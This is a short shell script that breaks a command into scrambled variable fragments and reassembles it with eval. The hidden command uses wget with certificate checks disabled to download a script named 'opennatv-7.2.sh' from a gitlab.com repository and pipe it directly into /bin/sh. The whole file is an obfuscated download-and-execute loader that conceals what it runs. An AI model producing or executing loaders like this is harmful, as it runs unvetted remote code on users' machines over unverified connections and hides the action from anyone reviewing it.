z="
";Az='wget';Oz='l1/i';Mz='emil';Cz='no-c';Tz='/ope';Bz='  --';Zz='bin/';Gz='cate';Rz='raw/';Xz='-O -';Wz='.sh ';Kz='lab.';Dz='heck';Qz='s/-/';az='sh';Jz='/git';bz='exit';Pz='mage';Hz=' htt';Uz='natv';Yz=' | /';Sz='main';cz=' 0';Ez='-cer';Iz='ps:/';Nz='nabi';Fz='tifi';Vz='-7.2';Lz='com/';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"